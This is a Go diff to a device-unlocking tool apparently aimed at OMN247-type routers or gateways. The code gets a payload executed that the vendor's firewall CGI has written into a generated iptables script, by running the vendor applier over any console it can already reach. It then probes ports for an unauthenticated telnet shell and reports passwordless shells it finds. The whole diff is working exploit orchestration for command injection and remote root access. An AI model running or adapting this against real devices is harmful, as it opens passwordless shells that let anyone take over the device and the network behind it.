@@ -28,8 +28,57 @@ type UnlockOptions struct {
 	// the classic, 2233 has been observed on unlocked OMN247 units, 9876 is the
 	// vendor's own gated telnet.
 	VerifyPorts []int
+	// Trigger enables the deterministic fallback: if the write was accepted but no
+	// console appeared, open whichever console IS reachable and run the vendor's
+	// applier (`/etc/tzscript/iptables_config`), which executes the generated
+	// /tmp/cmdlib/iptables/iptables_dmz_function. That file is where the payload
+	// actually lives; generating it is not running it.
+	Trigger bool
 	// ProbeTimeout bounds each network operation.
 	ProbeTimeout time.Duration
+}
+
+// ApplyScript is the vendor's firewall applier. It re-runs every generated rule
+// script, including iptables_dmz_function.
+const ApplyScript = "/etc/tzscript/iptables_config"
+
+// forceApply opens a console we can already reach and runs the applier.
+//
+// This is the difference between "the payload was written" and "the payload ran":
+// the CGI only *generates* /tmp/cmdlib/iptables/<name>; executing it is
+// iptables_config's job, and a save that aborts before that point leaves a
+// perfectly valid script that never runs.
+func (u *UnlockOrchestrator) forceApply(ports []int) (bool, string) {
+	sh, port, err := u.reachableShell(ports)
+	if err != nil {
+		return false, fmt.Sprintf("no console reachable to trigger the apply (%v)", err)
+	}
+	defer sh.Close()
+	sh.Timeout = 25 * time.Second
+	out, _, err := sh.Run("sh " + ApplyScript)
+	if err != nil {
+		return false, fmt.Sprintf("trigger via console on %d failed: %v", port, err)
+	}
+	_ = out
+	return true, fmt.Sprintf("ran %s over the console on tcp/%d", ApplyScript, port)
+}
+
+// reachableShell returns the first open console among ports.
+func (u *UnlockOrchestrator) reachableShell(ports []int) (*Shell, int, error) {
+	var lastErr error
+	for _, p := range ports {
+		addr := fmt.Sprintf("%s:%d", u.Host, p)
+		sh, err := DialShell(addr, u.Opts.ProbeTimeout)
+		if err != nil {
+			lastErr = err
+			continue
+		}
+		return sh, p, nil
+	}
+	if lastErr == nil {
+		lastErr = fmt.Errorf("no ports probed")
+	}
+	return nil, 0, lastErr
 }
 
 // UnlockResult reports what happened.
@@ -200,10 +249,17 @@ func (u *UnlockOrchestrator) Run() (UnlockResult, error) {
 		time.Sleep(2 * time.Second)
 
 		res.Shells = res.Shells[:0]
+		res.Succeeded = false
 		for _, p := range ports {
 			st := ProbeShell(u.Host, p, u.Opts.ProbeTimeout)
 			res.Shells = append(res.Shells, st)
-			if st.Open && st.NoAuth {
+			if !(st.Open && st.NoAuth) {
+				continue
+			}
+			// Success means the port we asked for, not merely *a* console: a box
+			// that already had an unauthenticated telnetd elsewhere answers on
+			// that port while our new daemon fails to bind.
+			if want == 0 || p == want {
 				res.Succeeded = true
 			}
 		}
@@ -213,9 +269,41 @@ func (u *UnlockOrchestrator) Run() (UnlockResult, error) {
 			}
 			return res, nil
 		}
+		if want != 0 {
+			for _, st := range res.Shells {
+				if st.Open && st.NoAuth && st.Port != want {
+					res.Notes = append(res.Notes, fmt.Sprintf(
+						"tcp/%d already serves a passwordless shell (not ours); tcp/%d is the one this run asked for",
+						st.Port, want))
+					break
+				}
+			}
+		}
 		if i < attempts {
 			res.Notes = append(res.Notes, fmt.Sprintf(
 				"attempt %d of %d: write accepted but no shell yet - retrying", i, attempts))
+		}
+	}
+
+	// Deterministic fallback: run the applier over a console we can already reach.
+	if u.Opts.Trigger {
+		if ok, note := u.forceApply(ports); ok {
+			res.Notes = append(res.Notes, note)
+			time.Sleep(2 * time.Second)
+			res.Shells = res.Shells[:0]
+			res.Succeeded = false
+			for _, p := range ports {
+				st := ProbeShell(u.Host, p, u.Opts.ProbeTimeout)
+				res.Shells = append(res.Shells, st)
+				if st.Open && st.NoAuth && (want == 0 || p == want) {
+					res.Succeeded = true
+				}
+			}
+			if res.Succeeded {
+				return res, nil
+			}
+		} else {
+			res.Notes = append(res.Notes, note)
 		}
 	}
 
